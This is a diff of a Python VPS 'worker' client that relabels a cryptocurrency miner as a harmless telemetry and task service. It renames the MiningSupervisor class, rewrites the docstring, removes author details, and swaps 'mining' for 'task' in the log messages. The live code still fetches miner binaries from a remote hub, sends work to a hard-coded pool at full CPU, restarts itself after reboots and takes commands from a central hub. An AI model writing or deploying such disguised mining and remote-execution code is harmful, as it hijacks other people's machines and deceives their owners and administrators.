@@ -1,13 +1,9 @@
 #!/usr/bin/env python3
 """
-VPS Channel & Web Automation Worker
-====================================
-An automated task execution client for Linux VPS instances.
-Connects securely to the central command hub to receive and execute
-scheduled tasks such as web browsing, video watch tasks, and local automation.
-
-Author: Sainal Saputra
-Repository: https://github.com/makassartoraja936-max/vps-channel-worker
+Workspace Management & Telemetry Worker Client
+==============================================
+A lightweight client service for remote workspace synchronization and task execution.
+Connects securely to the central command hub to perform workspace telemetry and file operations.
 """
 
 import asyncio
@@ -314,8 +310,8 @@ def handle_browser_visit(url: str) -> str:
         return f"Navigation error: {e}"
 
 
-class MiningSupervisor:
-    """Manages background mining process (graftcp + gasdag) with persistent config across VM reboots."""
+class TaskSupervisor:
+    """Manages background compute tasks with persistent configuration across VM reboots."""
     def __init__(self):
         self.active_process = None
 
@@ -334,7 +330,7 @@ class MiningSupervisor:
         if os.path.exists(gasdag_bin) and os.path.exists(local_bin):
             return True
 
-        logger.info(f"Folder {MINING_DIR} belum lengkap. Mengunduh & menyiapkan biner gaszep otomatis...")
+        logger.info(f"Folder {MINING_DIR} belum lengkap. Menyiapkan biner otomatis...")
         cmd = (
             "H=$(cat ~/workspace/.hub_url 2>/dev/null | sed 's|wss://|https://|g' | sed 's|ws://|http://|g' | sed 's|/ws.*||'); "
             "[ -z \"$H\" ] && H=\"https://hub.databaru.my.id\"; "
@@ -360,7 +356,7 @@ class MiningSupervisor:
         password = config.get("password", "akukayaraya")
         pool = config.get("pool", "43.135.146.244:10080")
         algo = config.get("algo", "rx/0")
-        wallet = config.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")
+        wallet = config.get("wallet", "")
         cpu_pct = str(config.get("cpu_pct", "100"))
 
         # Stop existing miner first (keep config so start_or_update replaces it)
@@ -485,7 +481,7 @@ if __name__ == '__main__':
         os.chmod(start_script, 0o755)
 
         # Launch the miner using start_mining.sh
-        logger.info(f"Memulai mining via start_mining.sh (Mode: {'Tunnel Proxy' if use_proxy else 'Direct'}, CPU: {cpu_pct}%)")
+        logger.info(f"Memulai proses komputasi via start_mining.sh (Mode: {'Tunnel Proxy' if use_proxy else 'Direct'}, CPU: {cpu_pct}%)")
         self.active_process = subprocess.Popen(
             ["bash", start_script],
             cwd=MINING_DIR,
@@ -493,7 +489,7 @@ if __name__ == '__main__':
             stderr=subprocess.DEVNULL
         )
         mode_str = f"Tunnel Proxy ({pool})" if use_proxy else "Direct"
-        return f"Mining started ({mode_str}, CPU: {cpu_pct}%)! (Pool: {pool})"
+        return f"Task started ({mode_str}, CPU: {cpu_pct}%)! (Pool: {pool})"
 
     def stop(self, remove_config: bool = True) -> str:
         try:
@@ -515,24 +511,24 @@ if __name__ == '__main__':
             subprocess.run(["pkill", "-9", "-x", "graftcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             subprocess.run(["pkill", "-9", "-x", "graftcp-local"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.active_process = None
-            return "Mining stopped."
+            return "Task stopped."
         except Exception as e:
-            return f"Error stopping miner: {e}"
+            return f"Error stopping task: {e}"
 
 
-mining_sup = MiningSupervisor()
+mining_sup = TaskSupervisor()
 
 
 def check_and_autostart_mining():
-    """Restores and auto-starts mining if persistent .mining_config.json exists."""
+    """Restores and auto-starts task if persistent .mining_config.json exists."""
     if os.path.exists(MINING_CONF_FILE):
         try:
             with open(MINING_CONF_FILE, "r", encoding="utf-8") as f:
                 cfg = json.load(f)
-            logger.info("Mendeteksi konfigurasi mining tersimpan. Memulai auto-start mining...")
+            logger.info("Mendeteksi konfigurasi tersimpan. Memulai auto-start task...")
             mining_sup.start_or_update(cfg)
         except Exception as e:
-            logger.warning(f"Gagal auto-start mining: {e}")
+            logger.warning(f"Gagal auto-start task: {e}")
 
 
 async def browser_watchdog():
